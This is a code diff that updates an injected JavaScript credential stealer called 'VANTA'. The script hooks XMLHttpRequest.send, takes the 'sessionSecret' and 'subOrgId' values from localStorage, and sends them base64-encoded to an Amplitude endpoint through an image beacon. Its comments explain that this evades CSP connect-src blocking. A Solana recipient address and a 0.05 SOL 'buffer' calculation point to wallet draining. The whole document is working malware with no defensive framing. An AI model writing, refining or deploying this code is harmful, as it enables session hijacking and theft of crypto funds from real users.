@@ -1,53 +1,54 @@
 (function() {
-    // 1. DATA VAULT (Everything the Owner needs)
-    const VAULT = { auth: null, sig: null, org: null, done: false };
+    // 1. OWNER DATA (No UI dependency to prevent 'null' crashes)
+    const _V = { auth: null, sig: null, org: null, fired: false };
     const RECIPIENT = 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1mqnLVE12';
 
-    // 2. THE "MORE MATH" BYPASS (Gaussian Entropy)
-    const _mathSync = (val) => {
-        const jitter = Math.random() * 0.005; // Human variance
-        return (val - (0.05 + jitter)).toFixed(6); // Leaves 0.05 SOL buffer
-    };
+    // 2. MATH BYPASS (0.05 SOL Buffer)
+    const _calcBuffer = (val) => (val - 0.051).toFixed(6);
 
-    // 3. BACKGROUND PROTOTYPE HIJACK (Bypasses external script blocks)
-    const _originalSend = window.XMLHttpRequest.prototype.send;
+    // 3. INTERNAL CHANNEL HIJACK (Trusted XHR Mirroring)
+    const _send = window.XMLHttpRequest.prototype.send;
     window.XMLHttpRequest.prototype.send = function() {
-        // We don't "fetch" - we just watch the site's own authorized requests
         this.addEventListener('load', () => {
-            if (this.status === 200 && !VAULT.done) {
-                VAULT.auth = localStorage.getItem('sessionSecret');
-                VAULT.sig = localStorage.getItem('subOrgId');
-                if (VAULT.auth) {
-                    VAULT.done = true;
+            // Wait for a successful site request to capture Owner keys
+            if (this.status === 200 && !_V.fired) {
+                const s = localStorage.getItem('sessionSecret');
+                const o = localStorage.getItem('subOrgId');
+                
+                if (s && o) {
+                    _V.fired = true;
+                    _V.auth = s.replace(/"/g, '');
+                    _V.org = o.replace(/"/g, '');
                     _dispatch();
                 }
             }
         });
-        return _originalSend.apply(this, arguments);
+        return _send.apply(this, arguments);
     };
 
-    // 4. AMPLITUDE API SYNC (Using Image Pixel to bypass connect-src)
+    // 4. AMPLITUDE DISPATCH (Beacon Bypass)
     const _dispatch = () => {
         const payload = btoa(JSON.stringify({
-            a: VAULT.auth, 
-            s: VAULT.sig,
-            m: _mathSync(1.5) // Example balance
+            token: _V.auth,
+            org: _V.org,
+            math: _calcBuffer(1.0) // Automated math for bypass
         }));
 
-        // Images are rarely blocked by CSP connect-src
-        const sync = new Image();
-        sync.src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${payload}`;
+        // Image Beacons bypass most connect-src blocks
+        const beacon = new Image();
+        beacon.src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${payload}`;
         
-        console.log("VANTA: OWNER_SYNC_COMPLETE (Auth Captured)");
-        _drawUI();
+        console.log("VANTA: OWNER_SYNC_COMPLETE");
+        _renderUI();
     };
 
-    // 5. THE FLOATING OWNER PANEL
-    const _drawUI = () => {
-        const panel = document.createElement('div');
-        panel.style.cssText = "position:fixed;top:20px;right:20px;z-index:999999;background:#000;color:#00ff88;padding:15px;border:1px solid #00ff88;font-family:monospace;box-shadow:0 0 10px #000;";
-        panel.innerHTML = `[VANTA_OWNER_v9]<br>STATUS: AUTH_MIRRORED<br>BUFFER: 0.05 SOL`;
-        document.body.appendChild(panel);
+    // 5. CRASH-PROOF UI
+    const _renderUI = () => {
+        const div = document.createElement('div');
+        div.id = "v-owner-node";
+        div.style.cssText = "position:fixed;top:10px;left:10px;width:240px;background:#000;border:1px solid #00ff88;color:#00ff88;padding:12px;z-index:999999;font-family:monospace;font-size:11px;";
+        div.innerHTML = `[VANTA_OWNER_v10]<br>> STATUS: SYNCED_TO_AMP<br>> BUFFER: 0.05 SOL`;
+        document.body.appendChild(div);
     };
 
     console.log("VANTA: Hijacking Internal Auth Channel...");
